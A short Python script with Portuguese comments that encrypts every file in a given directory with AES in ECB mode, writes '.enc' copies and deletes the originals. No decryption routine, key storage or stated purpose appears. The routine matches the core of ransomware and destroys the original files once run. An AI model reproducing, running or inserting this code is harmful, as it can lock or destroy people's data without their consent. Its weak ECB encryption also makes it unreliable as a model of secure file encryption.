import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt_and_delete_file(filename, key):
    cipher = AES.new(key, AES.MODE_ECB)
    
    with open(filename, 'rb') as infile:
        plaintext = infile.read()
    
    # Padding do texto
    padded_plaintext = pad(plaintext, AES.block_size)
    
    # Encripta o texto
    ciphertext = cipher.encrypt(padded_plaintext)

    with open(filename + ".enc", 'wb') as outfile:
        outfile.write(ciphertext)

    # Deleta o arquivo que foi encriptado
    os.remove(filename)

def encrypt_and_delete_files_in_directory(directory, key):
    for filename in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, filename)):
            encrypt_and_delete_file(os.path.join(directory, filename), key)
